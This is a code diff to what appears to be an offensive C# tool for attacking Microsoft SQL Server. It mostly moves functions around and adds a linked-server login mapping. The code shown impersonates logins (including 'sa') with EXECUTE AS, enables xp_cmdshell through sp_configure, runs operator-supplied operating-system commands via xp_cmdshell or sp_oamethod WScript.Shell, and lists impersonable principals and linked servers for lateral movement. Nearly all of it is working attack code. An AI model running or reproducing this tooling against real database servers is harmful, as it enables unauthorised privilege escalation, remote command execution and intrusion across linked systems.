@@ -140,6 +140,55 @@ namespace SQL
             }
         }
 
+        static void ImpersonateLoginAndExecuteCommand(SqlConnection con, string impersonatedLogin)
+        {
+            try
+            {
+                string impersonateCmd = $"EXECUTE AS LOGIN = '{impersonatedLogin}';";
+                SqlCommand impersonateCommand = new SqlCommand(impersonateCmd, con);
+                impersonateCommand.ExecuteNonQuery();
+                Console.WriteLine($"\nImpersonating login: {impersonatedLogin}...\n");
+
+                // Ask the user to choose between xp_cmdshell or sp_oamethod
+                Console.WriteLine("Choose how to execute the command:" + "\n");
+                Console.WriteLine("\t" + "1. Use xp_cmdshell");
+                Console.WriteLine("\t" + "2. Use sp_oamethod (WScript Shell)" + "\n");
+                Console.Write("Enter 1 or 2: ");
+                string execChoice = Console.ReadLine();
+
+                // Get the command to execute from the user
+                Console.Write("Enter the full command to execute: ");
+                string usercommand = Console.ReadLine();
+
+                if (execChoice == "1")
+                {
+                    // Execute using xp_cmdshell
+                    EnableXpCmdShell(con); // Ensure xp_cmdshell is enabled before running the command
+                    ExecuteCommandWithXpCmdShell(con, usercommand);
+                }
+                else if (execChoice == "2")
+                {
+                    // Execute using sp_oamethod
+                    ExecuteCommandWithSpOaMethod(con, usercommand);
+                }
+                else
+                {
+                    Console.WriteLine("Invalid choice. Please enter 1 or 2.");
+                }
+
+                // Revert the impersonation
+                string revertCmd = "REVERT;";
+                SqlCommand revertCommand = new SqlCommand(revertCmd, con);
+                revertCommand.ExecuteNonQuery();
+                Console.WriteLine("\n" + "Reverted impersonation." + "\n");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error impersonating login and executing command: " + ex.Message);
+            }
+        }
+
+
         static List<string> ListLinkedServers(SqlConnection con)
         {
             List<string> linkedServers = new List<string>();
@@ -167,6 +216,9 @@ namespace SQL
         {
             try
             {
+                // Ensure login mapping exists for the linked server
+                CreateLoginMapping(con, linkedServer);
+
                 Console.WriteLine($"\nExecuting commands on linked server: {linkedServer}\n");
 
                 Console.WriteLine("Choose an action:\n");
@@ -200,6 +252,22 @@ namespace SQL
             catch (Exception ex)
             {
                 Console.WriteLine("Error executing commands on linked server: " + ex.Message);
+            }
+        }
+
+        static void CreateLoginMapping(SqlConnection con, string linkedServer)
+        {
+            try
+            {
+                // Create login mapping for the linked server
+                string createMappingCmd = $"EXEC sp_addlinkedsrvlogin @rmtsrvname = '{linkedServer}', @useself = 'false', @locallogin = NULL, @rmtuser = 'remote_user', @rmtpassword = 'remote_password';";
+                SqlCommand command = new SqlCommand(createMappingCmd, con);
+                command.ExecuteNonQuery();
+                Console.WriteLine($"Login mapping created for linked server {linkedServer}.");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error creating login mapping for linked server: " + ex.Message);
             }
         }
 
@@ -273,77 +341,6 @@ namespace SQL
             return logins;
         }
 
-        static List<string> ListImpersonableUsers(SqlConnection con)
-        {
-            List<string> users = new List<string>();
-            string query = "SELECT name FROM sys.database_principals WHERE type IN ('S', 'U', 'G');";
-            SqlCommand command = new SqlCommand(query, con);
-
-            try
-            {
-                SqlDataReader reader = command.ExecuteReader();
-                while (reader.Read())
-                {
-                    users.Add(reader.GetString(0));
-                }
-                reader.Close();
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("Error listing users: " + ex.Message);
-            }
-
-            return users;
-        }
-
-        static void ImpersonateLoginAndExecuteCommand(SqlConnection con, string impersonatedLogin)
-        {
-            try
-            {
-                string impersonateCmd = $"EXECUTE AS LOGIN = '{impersonatedLogin}';";
-                SqlCommand impersonateCommand = new SqlCommand(impersonateCmd, con);
-                impersonateCommand.ExecuteNonQuery();
-                Console.WriteLine($"\nImpersonating login: {impersonatedLogin}...\n");
-
-                // Ask the user to choose between xp_cmdshell or sp_oamethod
-                Console.WriteLine("Choose how to execute the command:" + "\n");
-                Console.WriteLine("\t" + "1. Use xp_cmdshell");
-                Console.WriteLine("\t" + "2. Use sp_oamethod (WScript Shell)" + "\n");
-                Console.Write("Enter 1 or 2: ");
-                string execChoice = Console.ReadLine();
-
-                // Get the command to execute from the user
-                Console.Write("Enter the full command to execute: ");
-                string usercommand = Console.ReadLine();
-
-                if (execChoice == "1")
-                {
-                    // Execute using xp_cmdshell
-                    EnableXpCmdShell(con); // Ensure xp_cmdshell is enabled before running the command
-                    ExecuteCommandWithXpCmdShell(con, usercommand);
-                }
-                else if (execChoice == "2")
-                {
-                    // Execute using sp_oamethod
-                    ExecuteCommandWithSpOaMethod(con, usercommand);
-                }
-                else
-                {
-                    Console.WriteLine("Invalid choice. Please enter 1 or 2.");
-                }
-
-                // Revert the impersonation
-                string revertCmd = "REVERT;";
-                SqlCommand revertCommand = new SqlCommand(revertCmd, con);
-                revertCommand.ExecuteNonQuery();
-                Console.WriteLine("\n" + "Reverted impersonation." + "\n");
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("Error impersonating login and executing command: " + ex.Message);
-            }
-        }
-
         static void ImpersonateAndExecute(SqlConnection con, string impersonatedUser)
         {
             try
@@ -403,19 +400,36 @@ namespace SQL
             }
         }
 
-        static void EnableXpCmdShell(SqlConnection con)
+        static void ExecuteCommandWithSpOaMethod(SqlConnection con, string usercommand)
         {
             try
             {
-                // Enable xp_cmdshell if not already enabled
-                string enableCmd = "EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
-                SqlCommand enableCommand = new SqlCommand(enableCmd, con);
-                enableCommand.ExecuteNonQuery();
-                Console.WriteLine("Enabled xp_cmdshell.\n");
+                // Execute the command using sp_oamethod (WScript Shell)
+                string execCmd = $"EXEC sp_oamethod 'WScript.Shell', 'Run', null, '{usercommand}', 0, true;";
+                SqlCommand command = new SqlCommand(execCmd, con);
+                SqlDataReader reader = command.ExecuteReader();
+
+                bool hasOutput = false;
+                while (reader.Read())
+                {
+                    string result = reader.IsDBNull(0) ? null : reader.GetString(0);
+                    if (result != null)
+                    {
+                        Console.WriteLine(result);
+                        hasOutput = true;
+                    }
+                }
+
+                if (!hasOutput)
+                {
+                    Console.WriteLine("No output returned from sp_oamethod.");
+                }
+
+                reader.Close();
             }
             catch (Exception ex)
             {
-                Console.WriteLine("Error enabling xp_cmdshell: " + ex.Message);
+                Console.WriteLine("Error executing command with sp_oamethod: " + ex.Message);
             }
         }
 
@@ -454,37 +468,45 @@ namespace SQL
             }
         }
 
-        static void ExecuteCommandWithSpOaMethod(SqlConnection con, string usercommand)
+
+        static void EnableXpCmdShell(SqlConnection con)
         {
             try
             {
-                // Execute the command using sp_oamethod (WScript Shell)
-                string execCmd = $"EXEC sp_oamethod 'WScript.Shell', 'Run', null, '{usercommand}', 0, true;";
-                SqlCommand command = new SqlCommand(execCmd, con);
-                SqlDataReader reader = command.ExecuteReader();
+                // Enable xp_cmdshell if not already enabled
+                string enableCmd = "EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
+                SqlCommand enableCommand = new SqlCommand(enableCmd, con);
+                enableCommand.ExecuteNonQuery();
+                Console.WriteLine("Enabled xp_cmdshell.\n");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error enabling xp_cmdshell: " + ex.Message);
+            }
+        }
 
-                bool hasOutput = false;
+
+        static List<string> ListImpersonableUsers(SqlConnection con)
+        {
+            List<string> users = new List<string>();
+            string query = "SELECT name FROM sys.database_principals WHERE type IN ('S', 'U', 'G');";
+            SqlCommand command = new SqlCommand(query, con);
+
+            try
+            {
+                SqlDataReader reader = command.ExecuteReader();
                 while (reader.Read())
                 {
-                    string result = reader.IsDBNull(0) ? null : reader.GetString(0);
-                    if (result != null)
-                    {
-                        Console.WriteLine(result);
-                        hasOutput = true;
-                    }
+                    users.Add(reader.GetString(0));
                 }
-
-                if (!hasOutput)
-                {
-                    Console.WriteLine("No output returned from sp_oamethod.");
-                }
-
                 reader.Close();
             }
             catch (Exception ex)
             {
-                Console.WriteLine("Error executing command with sp_oamethod: " + ex.Message);
+                Console.WriteLine("Error listing users: " + ex.Message);
             }
+
+            return users;
         }
     }
 }
